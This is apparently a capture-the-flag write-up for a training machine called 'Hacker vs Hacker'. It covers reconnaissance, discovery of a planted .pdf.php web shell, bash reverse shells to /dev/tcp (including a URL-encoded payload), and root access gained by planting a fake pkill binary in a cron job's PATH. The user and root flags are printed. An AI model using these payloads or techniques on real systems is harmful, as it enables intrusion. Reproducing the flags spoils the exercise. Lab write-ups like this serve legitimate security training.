Hacker vs Hacker IP : 10.10.149.115



rustscan:

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=
|   256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


nikto:

└─$ nikto -h 10.10.149.115                                                                                                     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.149.115
+ Target Hostname:    10.10.149.115
+ Target Port:        80
+ Start Time:         2023-06-07 04:38:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: d55, size: 5dc0dbac96680, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ 7891 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-06-07 04:50:10 (GMT-4) (714 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




visiting upload page from site on port 80, we got this:

Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->

so, it seems, that it accepts files with .pdf. So, taking into account that it was hacked, I suppose that we should check the /cvs folder for files with .pdf.php


gobuster dir -u http://10.10.149.115/cvs -w /usr/share/wordlists/dirb/common.txt -t 64 -x .pdf.php                                                                                           1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.149.115/cvs
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     pdf.php
[+] Timeout:        10s
===============================================================
2023/06/07 04:43:01 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.pdf.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.pdf.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.pdf.php (Status: 403)
/index.html (Status: 200)
/shell.pdf.php (Status: 200)
===============================================================
2023/06/07 04:43:17 Finished
===============================================================


I was right,, there is a shell file

let's visit it

Visiting the page where the shell is hosted, we can check for command execution:

http://10.10.149.115/cvs/shell.pdf.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)


Now that we have command execution, we can try to get a reverse shell:
first we try this payload:

cmd=bash -i >& /dev/tcp/10.8.29.89/1234 0>&1 , but it doesnt work
then we try bash -c'bash -i >& /dev/tcp/10.8.29.89/1234 0>&1' and it doesnt work. we need to url encode it:

?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.29.89%2F1234%200%3E%261%27 this works, and we have a shell as www-data


└─$ nc -lvnp 1234                             
listening on [any] 1234 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.149.115] 48408
bash: cannot set terminal process group (769): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b2r:/var/www/html/cvs$ 



user flag:

www-data@b2r:/var/www/html/cvs$ cd /home
cd /home
www-data@b2r:/home$ ls
ls
lachlan
www-data@b2r:/home$ cd lachlan
cd lachlan
www-data@b2r:/home/lachlan$ ls
ls
bin
user.txt
www-data@b2r:/home/lachlan$ cat user.txt
cat user.txt
thm{af7e46b68081d4025c5ce10851430617}
www-data@b2r:/home/lachlan$ 



www-data@b2r:/home/lachlan$ cat .bash_history
cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
www-data@b2r:/home/lachlan$ 

while reading the contents of bash_history we can see that the password thisistheway123 was added to /etc/passwd
also, a cron hob was edited /etc/cron.d/persistence

we try to su as lachlan;

www-data@b2r:/home/lachlan$ su lachlan
su lachlan
Password: thisistheway123
ls
bin
user.txt
whoami
lachlan
python -c 'import pty;pty.spawn("/bin/bash")'
sh: 3: python: not found
python3 -c 'import pty;pty.spawn("/bin/bash")'
lachlan@b2r:~$ nope

but after a while the shell crashes, I wonder why.
maybe it works on ssh


ssh lachlan@10.10.149.115     
The authenticity of host '10.10.149.115 (10.10.149.115)' can't be established.
ECDSA key fingerprint is SHA256:1JL2Lj4XaQRN1Z9r5+bXLO4sqNT0NssAebebHwtmF/k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.149.115' (ECDSA) to the list of known hosts.
lachlan@10.10.149.115's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Jun 2023 08:56:39 AM UTC

  System load:  0.0               Processes:             129
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 10.10.149.115
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
$ nope
Connection to 10.10.149.115 closed.


the connection closes also on ssh.

Let's see what kills our conections . We discovered earlier, that there is a cron job that was modified ( /etc/cron.d/persistence). Let's check it out.


www-data@b2r:/home/lachlan$ cat /etc/cron.d/persistence
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done

we can see that this script runs every minute, and uses pkill to close all incoming terminal connections. The script is run as root, and the folder that it searches for the first time is /home/lachland/bin. If we have the right to write into this folder, we could get a reverse shell as root.

With the current user, we don't have the right to write into the bin folder:

www-data@b2r:/home/lachlan$ ls -la
ls -la
total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt

but we could use ssh as lachlan to write into that folder.

so we use : echo '#!/bin/bash\nbash -i >& /dev/tcp/10.8.29.89/4444 0>&1' > /home/lachlan/bin/pkill   to add a new pkill file that will get us a reverse shell as root
we use ssh to add the new file

and we need to add execute rights to the file:
chmod +x /home/lachlan/bin/pkill


ssh lachlan@10.10.149.115                                                                                                                                                                  255 ⨯
lachlan@10.10.149.115's password: 
Permission denied, please try again.
lachlan@10.10.149.115's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Jun 2023 09:09:47 AM UTC

  System load:  0.0               Processes:             125
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 10.10.149.115
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  7 09:09:26 2023 from 10.8.29.89
$ echo '#!/bin/bash\nbash -i >& /dev/tcp/10.8.29.89/4444 0>&1' > /home/lachlan/bin/pkill
$ nope
Connection to 10.10.149.115 closed.


ssh lachlan@10.10.149.115                                                                                                                                                                  255 ⨯
lachlan@10.10.149.115's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Jun 2023 09:12:23 AM UTC

  System load:  0.19              Processes:             131
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 10.10.149.115
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  7 09:11:56 2023 from 10.8.29.89
$ chmod +x /home/lachlan/bin/pkill
$ nope
nope
nope


─(kali㉿kali)-[~]
└─$ nc -lnvp 4444                                                                                                              
listening on [any] 4444 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.149.115] 36494
bash: cannot set terminal process group (3250): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# 

root@b2r:~# pwd
pwd
/root
root@b2r:~# ls
ls
root.txt
snap
root@b2r:~# cat root.txt
cat root.txt
thm{7b708e5224f666d3562647816ee2a1d4}
root@b2r:~# 
